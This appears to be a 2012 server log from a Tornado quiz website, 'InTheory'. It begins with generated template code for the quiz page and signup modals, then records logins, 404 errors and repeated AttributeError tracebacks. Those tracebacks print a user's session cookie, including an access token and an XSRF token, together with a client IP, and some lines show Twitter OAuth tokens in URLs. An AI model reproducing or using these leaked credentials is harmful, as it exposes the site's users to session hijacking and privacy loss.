208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
211      _append(_tmp)  # home.html:21 (via base.html:87)
212      _append('", "')  # home.html:21 (via base.html:87)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:87)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
217      _append(_tmp)  # home.html:21 (via base.html:87)
218      _append('"],"answer": ')  # home.html:21 (via base.html:87)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:87)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:87)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:87)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:87)
223      _append(_tmp)  # home.html:21 (via base.html:87)
224      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:87)
225      question = kwargs['questions'][0]  # home.html:25 (via base.html:87)
226      _append('\n<h4> ')  # home.html:26 (via base.html:87)
227      _tmp = question.question  # home.html:26 (via base.html:87)
228      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:87)
229      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:87)
230      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:87)
231      _append(_tmp)  # home.html:26 (via base.html:87)
232      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:87)
233      _tmp = len(question.answer)  # home.html:27 (via base.html:87)
234      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:87)
235      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:87)
236      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:87)
237      _append(_tmp)  # home.html:27 (via base.html:87)
238      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:87)
239      _tmp = question.options[0]  # home.html:28 (via base.html:87)
240      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:87)
241      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:87)
242      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:87)
243      _append(_tmp)  # home.html:28 (via base.html:87)
244      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:87)
245      _tmp = question.options[1]  # home.html:29 (via base.html:87)
246      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:87)
247      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:87)
248      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:87)
249      _append(_tmp)  # home.html:29 (via base.html:87)
250      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:87)
251      _tmp = question.options[2]  # home.html:30 (via base.html:87)
252      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:87)
253      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:87)
254      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:87)
255      _append(_tmp)  # home.html:30 (via base.html:87)
256      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:87)
257      _tmp = question.options[3]  # home.html:31 (via base.html:87)
258      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:87)
259      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:87)
260      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:87)
261      _append(_tmp)  # home.html:31 (via base.html:87)
262      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:87)
263      _tmp = kwargs['tweet']  # home.html:47 (via base.html:87)
264      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:87)
265      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:87)
266      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:87)
267      _append(_tmp)  # home.html:47 (via base.html:87)
268      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:87)
269      _append('\n')  # base.html:91
270      _tmp = xsrf_form_html()  # base.html:91
271      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
272      else: _tmp = _utf8(str(_tmp))  # base.html:91
273      _append(_tmp)  # base.html:91
274      _append('\n')  # base.html:92
275      _append('\n<script src="')  # base.html:93 (via base.html:92)
276      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:93 (via base.html:92)
277      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:93 (via base.html:92)
278      else: _tmp = _utf8(str(_tmp))  # base.html:93 (via base.html:92)
279      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:93 (via base.html:92)
280      _append(_tmp)  # base.html:93 (via base.html:92)
281      _append('"></script>\n<script src="')  # base.html:94 (via base.html:92)
282      _tmp = static_url('js/libs/blurb.min.js')  # base.html:94 (via base.html:92)
283      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:92)
284      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:92)
285      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:92)
286      _append(_tmp)  # base.html:94 (via base.html:92)
287      _append('"></script>\n<script src="')  # base.html:95 (via base.html:92)
288      _tmp = static_url('js/IT.js')  # base.html:95 (via base.html:92)
289      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:92)
290      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:92)
291      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:92)
292      _append(_tmp)  # base.html:95 (via base.html:92)
293      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:99 (via base.html:92)
294      _append('\n')  # base.html:101
295      for js in kwargs['js_deps']:  # base.html:101
296          _append('\n<script src="')  # base.html:102
297          _tmp = static_url(js)  # base.html:102
298          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:102
299          else: _tmp = _utf8(str(_tmp))  # base.html:102
300          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:102
301          _append(_tmp)  # base.html:102
302          _append('"></script>\n')  # base.html:103
303      _append('\n')  # base.html:105
304      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 5!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:105)
305      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:105)
306      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:105)
307      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:105)
308      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:105)
309      _append(_tmp)  # home.html:68 (via base.html:105)
310      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:105)
311      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:105)
312      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:105)
313      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:105)
314      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:105)
315      _append(_tmp)  # home.html:69 (via base.html:105)
316      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:105)
317      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:105)
318      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:105)
319      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:105)
320      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:105)
321      _append(_tmp)  # home.html:70 (via base.html:105)
322      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:105)
323      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:105)
324      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:105)
325      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:105)
326      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:105)
327      _append(_tmp)  # home.html:84 (via base.html:105)
328      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:105)
329      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright"><a href="/landing/about">About Us</a> | <a href="/landing/terms">Terms & Conditions</a> | <a href="/landing/privacy">Privacy Policy</a> | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:117
330      return _utf8('').join(_buffer)  # base.html:0
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
INFO:intheory-8001:Facebook user with id 5044e5008e4c8506039f20ab has successfully logged in.
WARNING:root:404 GET /None (127.0.0.1) 0.91ms
WARNING:root:404 GET /None (127.0.0.1) 1.20ms
WARNING:root:404 GET /admin/None (127.0.0.1) 1.13ms
WARNING:root:404 GET /None (127.0.0.1) 1.22ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.29ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.28ms
WARNING:root:404 GET /learn/None (127.0.0.1) 0.37ms
WARNING:root:404 GET /learn/None (127.0.0.1) 0.77ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.15ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /None (127.0.0.1) 1.47ms
WARNING:root:404 GET /None (127.0.0.1) 1.19ms
WARNING:root:404 GET /admin/None (127.0.0.1) 1.33ms
WARNING:root:404 GET /None (127.0.0.1) 1.18ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.35ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.11ms
WARNING:root:404 GET /None (127.0.0.1) 1.17ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.22ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.29ms
WARNING:root:404 GET /learn/None (127.0.0.1) 0.36ms
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.25ms
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 0.52ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.20ms
WARNING:root:404 GET /learn/None (127.0.0.1) 0.36ms
WARNING:root:404 GET /None (127.0.0.1) 0.56ms
WARNING:root:404 GET /None (127.0.0.1) 0.77ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.10ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.36ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.14ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.24ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /learn/None (127.0.0.1) 1.41ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.57ms
WARNING:root:404 GET /None (127.0.0.1) 1.23ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.21ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.15ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /learn/None (127.0.0.1) 1.56ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.51ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /learn/None (127.0.0.1) 1.53ms
WARNING:root:404 GET /None (127.0.0.1) 1.45ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /None (127.0.0.1) 1.60ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.51ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.26ms
WARNING:root:404 GET /learn/None (127.0.0.1) 1.15ms
WARNING:root:404 GET /None (127.0.0.1) 1.33ms
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=PvEpSEdvjpVq4M304hUI4HTKFbKzaI4tOq4gNDf4WH8&oauth_verifier=p7A7MJMUV5r4rvvq60VU7eu1ef5jA9mCxv5QZjH7n7Q (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=PvEpSEdvjpVq4M304hUI4HTKFbKzaI4tOq4gNDf4WH8&oauth_verifier=p7A7MJMUV5r4rvvq60VU7eu1ef5jA9mCxv5QZjH7n7Q (127.0.0.1) 3.28ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 34.75ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.82ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 2.32ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 3.59ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.80ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=1lBnsXpyv1z3PuvGC2AWOdhr8wZBMh66NjVLcIOfs8&oauth_verifier=ThNmQsQuuMQB7vRPk8ymM3qAdBDwmgnFlbKb5BSA9E (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=1lBnsXpyv1z3PuvGC2AWOdhr8wZBMh66NjVLcIOfs8&oauth_verifier=ThNmQsQuuMQB7vRPk8ymM3qAdBDwmgnFlbKb5BSA9E (127.0.0.1) 4.10ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
INFO:intheory-8000:Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
ERROR:root:Uncaught exception GET / (127.0.0.1)
